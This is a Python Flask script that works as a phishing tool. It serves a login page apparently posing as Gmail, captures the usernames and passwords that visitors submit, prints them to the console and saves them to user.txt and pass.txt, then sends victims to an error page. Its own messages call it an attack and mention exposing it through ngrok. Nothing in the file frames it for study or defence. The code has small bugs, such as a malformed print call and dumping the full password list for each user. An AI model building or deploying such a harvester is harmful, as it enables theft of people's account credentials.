from flask import Flask, render_template, request, redirect, session, url_for
import logging
import os

try:
    log_user = []
    log_pass = []
    null = "NULL00\n"

    f = open("user.txt","r+")
    f.write(null)
    f.close()

    f = open("pass.txt","r+")
    f.write(null)
    f.close()

    #Step – 2 (configuring your application)
    app = Flask(__name__)
    app.secret_key = "secret"
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    #step – 3 (creating a dictionary to store information about users)
    user = {"username": "user", "password": "password"}

    @app.route("/")
    def main():
        return redirect("/login")

    @app.route("/error")
    def error():
        return render_template("error.html")

    #Step – 4 (creating route for login)
    @app.route('/login', methods = ['POST', 'GET'])
    def login():
        global log_pass, log_user
        print("[GMAIL LOG] user logging in *fingers crossed*")
        if(request.method == 'POST'):
            username = request.form.get('username')
            password = request.form.get('password')

            #note: add a redirect after gmail login also authentication check for gmail  
            print("[GMAIL] user logged in!")
            print("USER: ", username)
            print("PASS: ", password)
            print("[GMAIL FILE] saving file...")
            
            username = username + "\n"
            password = password + "\n"

            log_user.append(username)
            log_pass.append(password) 

            with open("user.txt","r+") as file:
            #file = open("user.txt","r+")
                file.writelines(log_user)
                file.close()

            file = open("pass.txt","r+")
            file.writelines(log_pass)
            file.close()

            return redirect("/error")
        
        return render_template("login.html")

    '''        if username == user['username'] and password == user['password']:
                
                session['user'] = username
                return redirect('/dashboard')
    '''
    #        return """"<title>404 Page Not Found</title>
    #<main>
    #    <p>404 Page Not Found</p>
    #</main> """   
    #

    #Step -5(creating route for dashboard and logout)
    @app.route('/dashboard')
    def dashboard():
        if('user' in session and session['user'] == user['username']):
            return '<h1>Welcome to the dashboard</h1>'
        

        return '<h1>You are not logged in.</h1>'  

    #Step -6(creating route for logging out)
    @app.route('/logout')
    def logout():
        session.pop('user')         
        return redirect('/login')

    #Step -7(run the app)
    if __name__ == '__main__':
            os.system("clear")
            print("[CTRL+C] press CTRL+C to stop the attack")
            print("[GMAIL] running...")
            app.run(debug=True)
except KeyboardInterrupt:
    with open("user.txt","r+") as file:
    #file = open("user.txt","r+")
        file.writelines(log_user)
        file.close()

    file = open("pass.txt","r+")
    file.writelines(log_pass)
    file.close()

    os.system("clear")
    print("[GMAIL] all logged users + passowrds")
    x = len(log_user)

    for c in range(x):
        print("=====================")
        print("USER: ", log_user[c])
        print("PASS: ", log_pass)
        print("NUM: ". c)
        print("=====================")
    input("[ENTER] hit enter to continue (then close the ngrok window): ")